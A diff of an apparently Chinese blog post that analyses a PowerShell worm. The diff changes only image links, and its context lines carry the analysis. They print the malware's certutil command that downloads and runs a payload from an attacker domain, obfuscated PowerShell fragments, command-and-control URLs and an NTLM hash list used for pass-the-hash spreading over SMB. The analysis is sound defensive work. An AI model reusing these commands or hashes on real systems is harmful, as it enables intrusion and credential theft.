@@ -59,7 +59,7 @@
 <h2 id="0x02-分析过程">0x02 分析过程</h2>
 <h3 id="解密第一层">解密第一层</h3>
 <p>病毒样本：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x00.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/4d16b518-4f5f-11ec-b05e-00d861bf4abb.png" alt=""></p>
 <p>第一个动作，创建一个名为<code>Certificate</code>的任务计划，在七点开始，每隔一小时执行一次以下命令：</p>
 <pre tabindex="0"><code>
 cmd.exe /c (cd %temp%&amp;certutil -urlcache -split -f http://cert.beahh.com/cert.php?ver1=%COMPUTERNAME% v.dat&gt;nul&amp;expand -r v.dat&gt;nul&amp;v.bat&gt;nul&amp;del v.dat v.bat&gt;nul)
@@ -77,7 +77,7 @@ MachinePolicy       Undefined
   CurrentUser       Undefined
  LocalMachine          Bypass
 </code></pre><p>将后面的base64解密后：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x01.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/4d5d8218-4f5f-11ec-baeb-00d861bf4abb.png" alt=""></p>
 <p>得到如下代码：</p>
 <pre tabindex="0"><code>while($true)
 {
@@ -110,17 +110,17 @@ $c = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(
 Write-Host $c;
 }
 </code></pre><p>在这里我们使用Windows 10自带的Windows Powershell ISE脚本调试器来进行后续的分析。</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x02.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/4da5b0ce-4f5f-11ec-8b80-00d861bf4abb.png" alt=""></p>
 <h3 id="解密第二层">解密第二层</h3>
 <p>很明显，我们看到有<code>Invoke-Expression</code>，直接将<code>Invoke-Expression</code>改为<code>Write-Host</code>进行调试。</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x03.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/4df4fdfa-4f5f-11ec-9352-00d861bf4abb.png" alt=""></p>
 <h3 id="解密第三层">解密第三层</h3>
 <p>现在获得的代码可读性变得非常低了，但是还是有一定规律可循。</p>
 <p>在第83行，有一个大小写混合的<code>Invoke-Expression</code>：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x04.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/4e3585f0-4f5f-11ec-aae2-00d861bf4abb.png" alt=""></p>
 <p>并且<code>Invoke-Expression</code>做左边还有一个管道符，直接将代码改为<code>| Out-File .\tmp.log</code> ，把结果输出到tmp.log文件中。</p>
 <h3 id="解密第四层">解密第四层</h3>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x05.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/4e75dcae-4f5f-11ec-b69a-00d861bf4abb.png" alt=""></p>
 <p>第四次好像混淆的更加厉害来，但是不影响我们的分析，先看首行：</p>
 <pre tabindex="0"><code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')((('[string]3CHav = U'+'ABUAB[string]....
 </code></pre><p>其中它是以<code>. (表达式)(表达式)</code>来执行的，于是我想到了另外一种函数调用的可能：</p>
@@ -128,10 +128,10 @@ Write-Host $c;
 Rvn0xsy
 PS C:\Users\Rvn0xsy&gt;
 </code></pre><p>这样也能执行，所以我判断<code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')</code>就是<code>iex</code>或者<code>Invoke-Expression</code>，我将<code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')</code>改为<code>Write-Host</code>直接执行：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x06.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/4eb87816-4f5f-11ec-a2c3-00d861bf4abb.png" alt=""></p>
 <p>最终获得了未混淆的代码。</p>
 <p>然后，为了验证我的猜想，我把代码进行更改，获得了<code>Iex</code>：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x07.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/4ef7f8c4-4f5f-11ec-8df4-00d861bf4abb.png" alt=""></p>
 <p><code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')</code> = <code>Iex</code></p>
 <h2 id="0x03-行为分析">0x03 行为分析</h2>
 <pre tabindex="0"><code>[string]$av = &quot;&quot;[string]$avs = &quot;&quot;[string]$mac = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)$avs = (Get-WmiObject -Namesp
@@ -147,12 +147,12 @@ Microsoft\cred.ps1&quot; /F}}catch{}[System.Threading.Thread]::Sleep(3000)Stop-P
 <p>一般是<code>C:\Users\&lt;USERNAME&gt;\AppData\Local\Temp\ppp.log</code></p>
 <p>然后下载新的powershell文件，到<code>C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\cred.ps1</code>中。</p>
 <p>下载的URL是：http://172.104.177.202/new.dat?xl</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x08.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/4f43cf74-4f5f-11ec-b265-00d861bf4abb.png" alt=""></p>
 <p>目前ti上未打标签。</p>
 <p>再次经过N层解密后，得到如下代码：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x09.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/4f83bf76-4f5f-11ec-93f1-00d861bf4abb.png" alt=""></p>
 <p>大约6000多行</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x10.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/4fcaba3e-4f5f-11ec-934a-00d861bf4abb.png" alt=""></p>
 <p>脚本的功能：</p>
 <p>1.获得当前用户Hash，读取注册表</p>
 <p>2.获得当前系统版本、MAC地址、当前系统所有用户、反病毒软件，尤其是360 Zhudongfangyu服务</p>
@@ -161,7 +161,7 @@ Microsoft\cred.ps1&quot; /F}}catch{}[System.Threading.Thread]::Sleep(3000)Stop-P
 <p>其中，常用的Hash和用户名：</p>
 <pre tabindex="0"><code>[string[]]$global:alluser = @(&quot;administrator&quot;,&quot;admin&quot;)[string[]]$global:allpass = @(&quot;32ed87bdb5fdc5e9cba88547376818d4&quot;,&quot;8846f7eaee8fb117ad06bdd830b7586c&quot;,&quot;7b592e4f8178b4c75788531b2e747687&quot;,&quot;3fa45a060bd2693ae4c05b601d05ca0c&quot;,&quot;69943c5e63b4d2c104dbbcc15138b72b&quot;,&quot;588feb889288fb953b5f094d47d1565c&quot;,&quot;3dbde697d71690a769204beb12283678&quot;,&quot;df54de3f3438343202c1dd523d0265be&quot;,&quot;7ce21f17c0aee7fb9ceba532d0546ad6&quot;,&quot;2d7f1a5a61d3a96fb5159b5eef17adc6&quot;,&quot;6103d9d963c57275dd3533674708e7be&quot;,&quot;579110c49145015c47ecd267657d3174&quot;,&quot;af27efb60c7b238910efe2a7e0676a39&quot;,&quot;259745cb123a52aa2e693aaacca2db52&quot;,&quot;4057b60b514c5402dde3d29a1845c366&quot;,&quot;e8cd0e4a9e89eab931dc5338fcbec54a&quot;,&quot;f1351ac828428d74f6da2968089fc91f&quot;,&quot;b5fe2db507cc5ac540493d48fbd5fe33&quot;,&quot;12bdea0a1cb9486c067deaa851ac1609&quot;,&quot;f9e37e83b83c47a93c2f09f66408631b&quot;,&quot;b23a90d0aad9da3615fafc27a1b8baeb&quot;,&quot;a333f09e72c683f0205049d0db8b81fb&quot;,&quot;ad70819c5bc807280974d80f45982011&quot;,&quot;2d20d252a479f485cdf5e171d93985bf&quot;,&quot;0b6549421b2e7333e0e281f3ba5eea94&quot;,&quot;209c6174da490caeb422f3fa5a7ae634&quot;,&quot;a80c9cc3f8439ada25af064a874efe2d&quot;,&quot;22315d6ed1a7d5f8a7c98c40e9fa2dec&quot;,&quot;b963c57010f218edc2cc3c229b5e4d0f&quot;,&quot;96880159e785de5314803b1169768900&quot;,&quot;8ec60adea316d957d1cf532c5841758d&quot;,&quot;c22b315c040ae6e0efee3518d830362b&quot;,&quot;7a21990fcd3d759941e45c490f143d5f&quot;,&quot;328727b81ca05805a68ef26acb252039&quot;,&quot;31c72c210ecc03d1eae94fa496069448&quot;,&quot;209c6174da490caeb422f3fa5a7ae634&quot;,&quot;674e48b68c5cd0efd8f7e5faa87b3d1e&quot;,&quot;31fc0dc8f7dfad0e8bd7ccc3842f2ce9&quot;,&quot;579110c49145015c47ecd267657d3174&quot;,&quot;f2477a144dff4f216ab81f2ac3e3207d&quot;,&quot;62b26c13b70e7d5a9724710a41e63688&quot;,&quot;5835048ce94ad0564e29a924a03510ef&quot;,&quot;7773c08920232397cae081704964b786&quot;,&quot;a4141712f19e9dd5adf16919bb38a95c&quot;,&quot;b3ec3e03e2a202cbd54fd104b8504fef&quot;,&quot;f9e37e83b83c47a93c2f09f66408631b&quot;,&quot;162e829be112225fedf856e38e1c65fe&quot;,&quot;f67f5e3f66efd7298be6acd32eeeb27c&quot;)
 </code></pre><p>SMB服务传播代码：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x11.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/5006062a-4f5f-11ec-a903-00d861bf4abb.png" alt=""></p>
 <p>会上传启动项：<code>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat</code></p>
 <p>这个run.bat就是我拿到的种子了。</p>
 <p>该木马涵盖了Windows SMB客户端的所有代码，以及哈希传递技术的所有功能。</p>
@@ -170,13 +170,13 @@ Microsoft\cred.ps1&quot; /F}}catch{}[System.Threading.Thread]::Sleep(3000)Stop-P
 <pre tabindex="0"><code>10.
 172.
 192.168.
-</code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x12.png" alt=""></p>
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/5046ffe0-4f5f-11ec-8229-00d861bf4abb.png" alt=""></p>
 <p>其中在开始横向传播之前，它还会下载一个powershell代码：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x13.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/50afcbc4-4f5f-11ec-9c8c-00d861bf4abb.png" alt=""></p>
 <p>但是目前这个域名已经无法访问，无法继续进行跟进。</p>
 <p><code>http://p.beahh.com/upgrade.php?ver=1&amp;mac=</code></p>
 <p>其中在<code>$bytebase64</code>中发现了<code>run.bat</code>的代码：</p>
-<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2019-02-23/0x14.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/50ef6b44-4f5f-11ec-a7ce-00d861bf4abb.png" alt=""></p>
 <h2 id="0x04-预警与排查方案">0x04 预警与排查方案</h2>
 <ul>
 <li>1.开启Windows防火墙、关闭445端口。</li>
